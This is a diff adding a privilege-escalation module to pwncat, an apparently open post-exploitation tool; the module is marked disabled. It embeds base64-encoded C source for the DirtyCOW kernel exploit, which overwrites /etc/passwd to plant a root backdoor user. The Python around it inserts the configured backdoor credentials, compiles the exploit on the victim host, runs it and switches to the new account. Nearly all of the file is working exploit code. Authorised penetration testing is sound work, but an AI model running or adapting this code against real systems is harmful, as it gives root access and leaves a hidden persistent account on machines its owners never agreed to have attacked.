@@ -1,0 +1,124 @@
+#!/usr/bin/env python3
+import base64
+import io
+from typing import List
+
+import pwncat
+from pwncat import util
+from pwncat.gtfobins import Capability
+from pwncat.privesc import BaseMethod, Technique, PrivescError
+
+
+class Method_disabled(BaseMethod):
+    """
+    This method implements the DirtyCOW kernel privilege escalation exploit.
+
+    It is currently disabled as it depends on an old API.
+    """
+
+    name = "dirtycow"
+    BINARIES = []
+
+    def enumerate(self, capability: int = Capability.ALL) -> List[Technique]:
+        """ Find all techniques known at this time """
+
+        if Capability.SHELL not in capability:
+            return []
+
+        facts = [
+            f
+            for f in pwncat.victim.enumerate("system.kernel.exploit")
+            if f.data.name == "dirty_cow"
+        ]
+        if not facts:
+            raise PrivescError("kernel not vulnerable")
+
+        return [Technique("root", self, None, Capability.SHELL)]
+
+    def execute(self, technique: Technique):
+        """ Run the specified technique """
+
+        # Minified dirtycow source code
+        dc_source = r"""
+I2luY2x1ZGU8ZmNudGwuaD4KI2luY2x1ZGU8cHRocmVhZC5oPgojaW5jbHVkZTxzdHJpbmcuaD4K
+I2luY2x1ZGU8c3RkaW8uaD4KI2luY2x1ZGU8c3RkaW50Lmg+CiNpbmNsdWRlPHN5cy9tbWFuLmg+
+CiNpbmNsdWRlPHN5cy90eXBlcy5oPgojaW5jbHVkZTxzeXMvc3RhdC5oPgojaW5jbHVkZTxzeXMv
+d2FpdC5oPgojaW5jbHVkZTxzeXMvcHRyYWNlLmg+CiNpbmNsdWRlPHN0ZGxpYi5oPgojaW5jbHVk
+ZTx1bmlzdGQuaD4KI2luY2x1ZGU8Y3J5cHQuaD4KY29uc3QgY2hhcipmaWxlbmFtZT0iL2V0Yy9w
+YXNzd2QiO2NvbnN0IGNoYXIqYmFja3VwX2ZpbGVuYW1lPSIvdG1wLy5wd25jYXQiO2NvbnN0IGNo
+YXIqc2FsdD0iUFdOQ0FUX1NBTFQiO2ludCBmO3ZvaWQqbWFwO3BpZF90IHBpZDtwdGhyZWFkX3Qg
+cHRoO3N0cnVjdCBzdGF0IHN0O3N0cnVjdCBVc2VyaW5mb3tjaGFyKnVzZXJuYW1lO2NoYXIqaGFz
+aDtpbnQgdXNlcl9pZDtpbnQgZ3JvdXBfaWQ7Y2hhcippbmZvO2NoYXIqaG9tZV9kaXI7Y2hhcipz
+aGVsbDt9O2NoYXIqZ2VuZXJhdGVfcGFzc3dvcmRfaGFzaChjaGFyKnBsYWludGV4dF9wdyl7cmV0
+dXJuIGNyeXB0KHBsYWludGV4dF9wdyxzYWx0KTt9Y2hhcipnZW5lcmF0ZV9wYXNzd2RfbGluZShz
+dHJ1Y3QgVXNlcmluZm8gdSl7Y29uc3QgY2hhcipmb3JtYXQ9IiVzOiVzOiVkOiVkOiVzOiVzOiVz
+XG4iO2ludCBzaXplPXNucHJpbnRmKE5VTEwsMCxmb3JtYXQsdS51c2VybmFtZSx1Lmhhc2gsdS51
+c2VyX2lkLHUuZ3JvdXBfaWQsdS5pbmZvLHUuaG9tZV9kaXIsdS5zaGVsbCk7Y2hhcipyZXQ9bWFs
+bG9jKHNpemUrMSk7c3ByaW50ZihyZXQsZm9ybWF0LHUudXNlcm5hbWUsdS5oYXNoLHUudXNlcl9p
+ZCx1Lmdyb3VwX2lkLHUuaW5mbyx1LmhvbWVfZGlyLHUuc2hlbGwpO3JldHVybiByZXQ7fXZvaWQq
+bWFkdmlzZVRocmVhZCh2b2lkKmFyZyl7aW50IGksYz0wO2ZvcihpPTA7aTwyMDAwMDAwMDA7aSsr
+KXtjKz1tYWR2aXNlKG1hcCwxMDAsTUFEVl9ET05UTkVFRCk7fX1pbnQgY29weV9maWxlKGNvbnN0
+IGNoYXIqZnJvbSxjb25zdCBjaGFyKnRvKXtpZihhY2Nlc3ModG8sRl9PSykhPS0xKXtyZXR1cm4t
+MTt9Y2hhciBjaDtGSUxFKnNvdXJjZSwqdGFyZ2V0O3NvdXJjZT1mb3Blbihmcm9tLCJyIik7aWYo
+c291cmNlPT1OVUxMKXtyZXR1cm4tMTt9dGFyZ2V0PWZvcGVuKHRvLCJ3Iik7aWYodGFyZ2V0PT1O
+VUxMKXtmY2xvc2Uoc291cmNlKTtyZXR1cm4tMTt9d2hpbGUoKGNoPWZnZXRjKHNvdXJjZSkpIT1F
+T0Ype2ZwdXRjKGNoLHRhcmdldCk7fWZjbG9zZShzb3VyY2UpO2ZjbG9zZSh0YXJnZXQpO3JldHVy
+biAwO31pbnQgbWFpbihpbnQgYXJnYyxjaGFyKmFyZ3ZbXSl7aW50IHJldD1jb3B5X2ZpbGUoZmls
+ZW5hbWUsYmFja3VwX2ZpbGVuYW1lKTtpZihyZXQhPTApe2V4aXQocmV0KTt9c3RydWN0IFVzZXJp
+bmZvIHVzZXI7dXNlci51c2VybmFtZT0iUFdOQ0FUX1VTRVIiO3VzZXIudXNlcl9pZD0wO3VzZXIu
+Z3JvdXBfaWQ9MDt1c2VyLmluZm89InB3bmVkIjt1c2VyLmhvbWVfZGlyPSIvcm9vdCI7dXNlci5z
+aGVsbD0iL2Jpbi9iYXNoIjtjaGFyKnBsYWludGV4dF9wdztwbGFpbnRleHRfcHc9IlBXTkNBVF9Q
+QVNTIjt1c2VyLmhhc2g9Z2VuZXJhdGVfcGFzc3dvcmRfaGFzaChwbGFpbnRleHRfcHcpO2NoYXIq
+Y29tcGxldGVfcGFzc3dkX2xpbmU9Z2VuZXJhdGVfcGFzc3dkX2xpbmUodXNlcik7Zj1vcGVuKGZp
+bGVuYW1lLE9fUkRPTkxZKTtmc3RhdChmLCZzdCk7bWFwPW1tYXAoTlVMTCxzdC5zdF9zaXplK3Np
+emVvZihsb25nKSxQUk9UX1JFQUQsTUFQX1BSSVZBVEUsZiwwKTtwaWQ9Zm9yaygpO2lmKHBpZCl7
+d2FpdHBpZChwaWQsTlVMTCwwKTtpbnQgdSxpLG8sYz0wO2ludCBsPXN0cmxlbihjb21wbGV0ZV9w
+YXNzd2RfbGluZSk7Zm9yKGk9MDtpPDEwMDAwL2w7aSsrKXtmb3Iobz0wO288bDtvKyspe2Zvcih1
+PTA7dTwxMDAwMDt1Kyspe2MrPXB0cmFjZShQVFJBQ0VfUE9LRVRFWFQscGlkLG1hcCtvLCooKGxv
+bmcqKShjb21wbGV0ZV9wYXNzd2RfbGluZStvKSkpO319fX1lbHNle3B0aHJlYWRfY3JlYXRlKCZw
+dGgsTlVMTCxtYWR2aXNlVGhyZWFkLE5VTEwpO3B0cmFjZShQVFJBQ0VfVFJBQ0VNRSk7a2lsbChn
+ZXRwaWQoKSxTSUdTVE9QKTtwdGhyZWFkX2pvaW4ocHRoLE5VTEwpO31yZXR1cm4gMDt9
+        """.replace(
+            "\n", ""
+        ).strip()
+        dc_source = base64.b64decode(dc_source).decode("utf-8")
+
+        # Set the user and password in the above source code
+        dc_source = dc_source.replace(
+            "PWNCAT_USER", pwncat.victim.config["backdoor_user"]
+        )
+        dc_source = dc_source.replace(
+            "PWNCAT_PASS", pwncat.victim.config["backdoor_pass"]
+        )
+
+        # Compile the exploit
+        remote_path = pwncat.victim.compile(
+            [io.StringIO(dc_source)], cflags=["-pthread"], ldflags=["-lcrypt"]
+        )
+
+        # Run Dirtycow
+        util.warn("dirtycow: attempting dirtycow... this may take some time...")
+        try:
+            pwncat.victim.run(remote_path)
+        except KeyboardInterrupt:
+            # Plz stahp
+            pwncat.victim.client.send(util.CTRL_C * 3)
+            # Let this go up, we just want to make sure that the dirtycow stops
+            raise
+        finally:
+            # pwncat.victim.env(["rm", "-f", remote_path])
+            pass
+
+        # Reload /etc/passwd
+        pwncat.victim.reload_users()
+
+        # Ensure the new user was created
+        if pwncat.victim.config["backdoor_user"] not in pwncat.victim.users:
+            raise PrivescError("backdoor user not created")
+
+        # Become the new user!
+        pwncat.victim.su(
+            pwncat.victim.config["backdoor_user"], pwncat.victim.config["backdoor_pass"]
+        )
+
+        return "exit"
